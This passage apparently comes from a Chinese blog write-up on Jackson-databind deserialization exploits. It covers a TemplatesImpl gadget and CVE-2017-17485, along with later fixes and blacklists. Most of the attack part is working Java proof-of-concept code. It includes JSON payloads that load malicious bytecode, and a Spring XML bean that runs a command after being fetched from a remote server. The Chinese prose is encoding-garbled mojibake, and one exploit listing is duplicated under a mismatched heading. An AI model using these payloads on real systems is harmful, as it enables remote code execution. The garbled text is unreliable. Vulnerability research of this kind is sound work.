data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013111700984.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æœ‰æ²¡æœ‰æ³¨æ„åˆ°æˆ‘ä»¬å¹¶æ²¡æœ‰è®¾ç½®ä¸€èˆ¬éƒ½ä¼šè®¾ç½®çš„<code>_tfactory</code></p><p>åœ¨CCä¸­æˆ‘ä»¬ä¸è®¾ç½®ï¼Œæ˜¯å› ä¸ºreadObjectå¸®æˆ‘ä»¬è®¾ç½®äº†</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013113237325.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013113237325.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨JDKä½ç‰ˆæœ¬ç”¨ä¸åˆ°<code>_tfactory</code>ï¼Œæ‰€ä»¥ä¸è®¾ç½®ä¹Ÿæ²¡é—®é¢˜</p><p>åœ¨JDK&gt;7U21||&gt;8u20çš„æƒ…å†µä¸‹ï¼Œä¸è®¾ç½®<code>_tfactory</code>defineTransletClassesä¼šæŠ¥é”™</p><p>åŒºåˆ«å¦‚ä¸‹ï¼š</p><p>å·¦ä¸ºJDK8U65ï¼Œå³ä¸ºJDK7U21</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013114035230.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013114035230.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h3 id="JsonTypeInfo-Id-CLASS-POC"><a href="#JsonTypeInfo-Id-CLASS-POC" class="headerlink" title="JsonTypeInfo.Id.CLASS POC"></a>JsonTypeInfo.Id.CLASS POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.third.jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Id_MINIMAL_Class_TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Id_Class_Test</span> &#123;</span><br><span class="line">        <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span></span><br><span class="line">        <span class="keyword">public</span> Object object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> readClassStr(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonInput</span> <span class="operator">=</span> aposToQuotes(<span class="string">&quot;&#123;\&quot;object\&quot;:&#123;&#x27;@c&#x27;:&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;transletBytecodes&#x27;:[&#x27;&quot;</span>+exp+<span class="string">&quot;&#x27;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;transletName&#x27;:&#x27;test&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;outputProperties&#x27;:&#123;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.printf(jsonInput);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Id_Class_Test</span> <span class="variable">test</span> <span class="operator">=</span> mapper.readValue(jsonInput, Id_Class_Test.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">aposToQuotes</span><span class="params">(String json)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClassStr</span><span class="params">(String cls)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> Base64.encode(code1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="JsonTypeInfo-Id-MIMIMAL-CLASS-POC"><a href="#JsonTypeInfo-Id-MIMIMAL-CLASS-POC" class="headerlink" title="JsonTypeInfo.Id.MIMIMAL_CLASS POC"></a>JsonTypeInfo.Id.MIMIMAL_CLASS POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.exploit.third.jackson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.annotation.JsonTypeInfo;</span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Id_MINIMAL_Class_TemplatesImpl</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Id_Class_Test</span> &#123;</span><br><span class="line">        <span class="meta">@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)</span></span><br><span class="line">        <span class="keyword">public</span> Object object;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> readClassStr(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonInput</span> <span class="operator">=</span> aposToQuotes(<span class="string">&quot;&#123;\&quot;object\&quot;:&#123;&#x27;@c&#x27;:&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;transletBytecodes&#x27;:[&#x27;&quot;</span>+exp+<span class="string">&quot;&#x27;],\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;transletName&#x27;:&#x27;test&#x27;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;outputProperties&#x27;:&#123;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.printf(jsonInput);</span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Id_Class_Test</span> <span class="variable">test</span> <span class="operator">=</span> mapper.readValue(jsonInput, Id_Class_Test.class);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">aposToQuotes</span><span class="params">(String json)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClassStr</span><span class="params">(String cls)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] code1 = Files.readAllBytes(Paths.get(<span class="string">&quot;E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\target\\classes\\TemplatesImpl_RuntimeEvil.class&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> Base64.encode(code1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastjsonè·‘ä¸äº†è¿™ä¸ªé“¾ï¼Œå› ä¸ºfastjsonå¯¹äºgetOutputPropertiesè¿™ç§getteræ˜¯ä¸ä¼šè°ƒç”¨çš„ï¼Œè¿”å›å€¼ä¸æ»¡è¶³è¦æ±‚</p><h3 id="ä¿®å¤"><a href="#ä¿®å¤" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p>pom.xmlä¿®æ”¹jackson-databindç‰ˆæœ¬è‡³2.7.9.1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">   &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt;</span><br><span class="line">   &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt;</span><br><span class="line">   &lt;version&gt;2.7.9.1&lt;/version&gt;</span><br></pre></td></tr></table></figure><p>å†æ¬¡è¿è¡ŒæŠ¥<code>Illegal type to deserialize: prevented for security reasons</code>é”™è¯¯</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013133638872.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013133638872.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åŠ äº†checkIllegalTypesé»‘åå•éªŒè¯</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013133921885.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013133921885.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åŒ…æ‹¬ä»¥ä¸‹ç±»ï¼ŒTemplatesImplè¢«è¿‡æ»¤</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013134035475.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241013134035475.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><h2 id="CVE-2017-17485-ClassPathXmlApplicationContexté“¾"><a href="#CVE-2017-17485-ClassPathXmlApplicationContexté“¾" class="headerlink" title="CVE-2017-17485 ClassPathXmlApplicationContexté“¾"></a>CVE-2017-17485 ClassPathXmlApplicationContexté“¾</h2><p>Jackson 2.7ç³»åˆ— &lt; 2.7.9.2</p><p>Jackson 2.8ç³»åˆ— &lt; 2.8.11</p><p>Jackson 2.9ç³»åˆ— &lt; 2.9.4</p><p>jdkæ— ç‰ˆæœ¬é™åˆ¶</p><p>æ­¤æ¼æ´ä¸ºjacksonæ‰“springï¼Œéœ€è¦ç‚¹ä¸Šspringçš„ä¾èµ–ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-expression<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>spELè¡¨è¾¾å¼æ³¨å…¥ï¼š</p><p><a href="https://godownio.github.io/2024/10/14/spel-biao-da-shi-zhu-ru/">https://godownio.github.io/2024/10/14/spel-biao-da-shi-zhu-ru/</a></p><p>é»˜è®¤singletonæ¨¡å¼ä¸‹ï¼ŒClassPathXmlApplicationContextåŠ è½½xmlèµ„æºï¼Œå¹¶å®Œæˆå®ä¾‹åŒ–å’Œè°ƒç”¨setterä¼ å‚ã€‚è¿™ä¸ªxmlèµ„æºå¯ä»¥æ˜¯httpè·¯å¾„ã€‚ï¼ˆæ— éœ€getBeanå°±èƒ½è§¦å‘æ•´ä¸ªåˆ›å»ºBeançš„æµç¨‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    ApplicationContext applicationContext=<span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;http://127.0.0.1:8888/spel.xml&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>spel.xmlå†…çš„beanéœ€è¦å…ˆåˆ›å»ºå®ä¾‹ï¼Œå†æ‰§è¡ŒspELè¡¨è¾¾å¼ï¼Œæ‰€ä»¥å¾—æ‰¾ä¸€ä¸ªèƒ½newï¼Œç„¶åæ‰§è¡Œå‘½ä»¤çš„æ–¹å¼ï¼ŒRuntime newä¸äº†</p><p>ProcesserBuilderå°±å¾ˆåˆé€‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ProcessBuilder</span> <span class="variable">pb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;command&quot;</span>,<span class="string">&quot;param...&quot;</span>);</span><br><span class="line"><span class="type">Process</span> <span class="variable">pro2</span> <span class="operator">=</span> pb.start();</span><br></pre></td></tr></table></figure><p>å¼¹è®¡ç®—å™¨ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">constructor-arg</span> <span class="attr">name</span>=<span class="string">&quot;command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;calc&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123;pb.start()&#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>jacksonèƒ½è°ƒç”¨æœ‰å‚æ„é€ å‡½æ•°ï¼ŒenableDefaultTyping POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PoC</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>  &#123;  </span><br><span class="line">        <span class="comment">//CVE-2017-17485  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;[\&quot;org.springframework.context.support.ClassPathXmlApplicationContext\&quot;, \&quot;http://127.0.0.1:8888/spel.xml\&quot;]&quot;</span>;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        mapper.enableDefaultTyping();  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            mapper.readValue(payload, Object.class);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ä¿®å¤-1"><a href="#ä¿®å¤-1" class="headerlink" title="ä¿®å¤"></a>ä¿®å¤</h3><p><a href="https://github.com/FasterXML/jackson-databind/commit/2235894210c75f624a3d0cd60bfb0434a20a18bf">https://github.com/FasterXML/jackson-databind/commit/2235894210c75f624a3d0cd60bfb0434a20a18bf</a></p><p>æ¢æˆ jackson-databind-2.7.9.2ç‰ˆæœ¬çš„ jar è¯•è¯•ï¼Œä¼šæŠ¥é”™ï¼Œæ˜¾ç¤ºç”±äºå®‰å…¨åŸå› ç¦æ­¢äº†è¯¥éæ³•ç±»çš„ååºåˆ—åŒ–æ“ä½œï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014121854126.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014121854126.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é»‘åå•ä½äºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.fasterxml.jackson.databind.jsontype.impl.SubTypeValidator</span><br></pre></td></tr></table></figure><p>å¹¶æ²¡æœ‰çœ‹åˆ°é»‘åå•ç±»é‡Œé¢æœ‰æˆ‘ä»¬åˆ©ç”¨çš„è¿™ä¸ªç±»</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014121955829.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241014121955829.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å†å¾€ä¸‹çœ‹ï¼Œè¿™é‡Œä¼šæŠŠæ‰€æœ‰ <code>org.springframe</code> å¼€å¤´çš„ç±»ååšå¤„ç†</p><p><img src="https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/fullStartsBan.png" class="lazyload placeholder" data-srcset="https://drun1baby.top/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/fullStartsBan.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å…ˆè¿›è¡Œé»‘åå•è¿‡æ»¤ï¼Œå‘ç°ç±»åä¸åœ¨é»‘åå•åå†åˆ¤æ–­æ˜¯å¦æ˜¯ä»¥ <code>org.springframe</code> å¼€å¤´çš„ç±»åï¼Œæ˜¯çš„è¯å¾ªç¯éå†ç›®æ ‡ç±»çš„çˆ¶ç±»æ˜¯å¦ä¸º <code>AbstractPointcutAdviso</code> æˆ– <code>AbstractApplicationContext</code>ï¼Œæ˜¯çš„è¯è·³å‡ºå¾ªç¯ç„¶åæŠ›å‡ºå¼‚å¸¸ï¼š</p><p>è€Œæˆ‘ä»¬çš„åˆ©ç”¨ç±»å…¶ç»§æ‰¿å…³ç³»æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â€¦-&gt;AbstractApplicationContext-&gt;</span><br><span class="line">    AbstractRefreshableApplicationContext-&gt;</span><br><span class="line">    AbstractRefreshableConfigApplicationContext-&gt;</span><br><span class="line">    AbstractXmlApplicationContext-&gt;</span><br><span class="line">    ClassPathXmlApplicationContext</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼ŒClassPathXmlApplicationContext ç±»æ˜¯ç»§æ‰¿è‡ª AbstractApplicationContext ç±»çš„ï¼Œè€Œè¯¥ç±»ä¼šè¢«è¿‡æ»¤æ‰ï¼Œä»è€Œæ²¡åŠæ³•æˆåŠŸç»•è¿‡åˆ©ç”¨ã€‚</p><h2 id="æ‰“ä¾èµ–åŒ…é€šæ€"><a href="#æ‰“ä¾èµ–åŒ…é€šæ€" class="headerlink" title="æ‰“ä¾èµ–åŒ…é€šæ€"></a>æ‰“ä¾èµ–åŒ…é€šæ€</h2><p>æ­¤å¤„é€šæ€æŒ‡æ‰“ä¾èµ–åŒ…ï¼Œä¸æ˜¯readValueä½œä¸ºå…¥å£</p><p>jackson-databind&gt;&#x3D;2.13.3</p><p>jackson-databind core annotationsä¸‰åŒ…ç‰ˆæœ¬éœ€åŒ¹é…</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 